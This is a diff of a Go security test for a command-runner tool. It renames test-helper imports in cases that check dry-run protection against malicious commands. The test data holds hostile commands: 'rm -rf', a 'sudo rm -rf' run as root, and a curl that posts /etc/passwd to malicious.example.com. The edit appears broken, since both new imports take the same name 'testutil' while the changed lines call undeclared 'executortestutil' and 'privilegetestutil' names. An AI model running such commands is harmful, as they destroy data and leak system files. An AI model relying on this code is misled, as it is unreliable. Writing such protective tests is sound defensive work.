@@ -8,8 +8,8 @@ import (
 	"testing"
 
 	"github.com/isseis/go-safe-cmd-runner/internal/filevalidator"
-	executortesting "github.com/isseis/go-safe-cmd-runner/internal/runner/base/executor/testutil"
-	privilegetesting "github.com/isseis/go-safe-cmd-runner/internal/runner/base/privilege/testutil"
+	"github.com/isseis/go-safe-cmd-runner/internal/runner/base/executor/testutil"
+	"github.com/isseis/go-safe-cmd-runner/internal/runner/base/privilege/testutil"
 	"github.com/isseis/go-safe-cmd-runner/internal/runner/base/runnertypes"
 	"github.com/isseis/go-safe-cmd-runner/internal/runner/resource"
 	tu "github.com/isseis/go-safe-cmd-runner/internal/testutil"
@@ -257,10 +257,10 @@ func TestMaliciousConfigCommandControlSecurity(t *testing.T) {
 	}{
 		{
 			name: "dangerous_rm_command_dry_run_protection",
-			cmd: executortesting.CreateRuntimeCommand(
+			cmd: executortestutil.CreateRuntimeCommand(
 				"rm",
 				[]string{"-rf", "/tmp/should-not-execute-in-test"},
-				executortesting.WithName("dangerous-rm")),
+				executortestutil.WithName("dangerous-rm")),
 			group: &runnertypes.GroupSpec{
 				Name: "malicious-group",
 			},
@@ -270,9 +270,9 @@ func TestMaliciousConfigCommandControlSecurity(t *testing.T) {
 		},
 		{
 			name: "sudo_privilege_escalation_protection",
-			cmd: executortesting.CreateRuntimeCommand("sudo", []string{"rm", "-rf", "/tmp/test-sudo-target"},
-				executortesting.WithName("sudo-escalation"),
-				executortesting.WithRunAsUser("root"),
+			cmd: executortestutil.CreateRuntimeCommand("sudo", []string{"rm", "-rf", "/tmp/test-sudo-target"},
+				executortestutil.WithName("sudo-escalation"),
+				executortestutil.WithRunAsUser("root"),
 			),
 			group: &runnertypes.GroupSpec{
 				Name: "privilege-escalation-group",
@@ -283,10 +283,10 @@ func TestMaliciousConfigCommandControlSecurity(t *testing.T) {
 		},
 		{
 			name: "network_exfiltration_command_protection",
-			cmd: executortesting.CreateRuntimeCommand(
+			cmd: executortestutil.CreateRuntimeCommand(
 				"curl",
 				[]string{"-X", "POST", "-d", "@/etc/passwd", "https://malicious.example.com/steal"},
-				executortesting.WithName("data-exfil"),
+				executortestutil.WithName("data-exfil"),
 			),
 			group: &runnertypes.GroupSpec{
 				Name: "network-exfil-group",
@@ -302,8 +302,8 @@ func TestMaliciousConfigCommandControlSecurity(t *testing.T) {
 			// RuntimeCommand doesn't need PrepareCommand
 
 			// Create DryRunResourceManager with mocks
-			mockExec := executortesting.NewMockExecutor()
-			mockPriv := privilegetesting.NewMockPrivilegeManager(true)
+			mockExec := executortestutil.NewMockExecutor()
+			mockPriv := privilegetestutil.NewMockPrivilegeManager(true)
 			mockPathResolver := &MockPathResolver{}
 
 			// Setup command path resolution
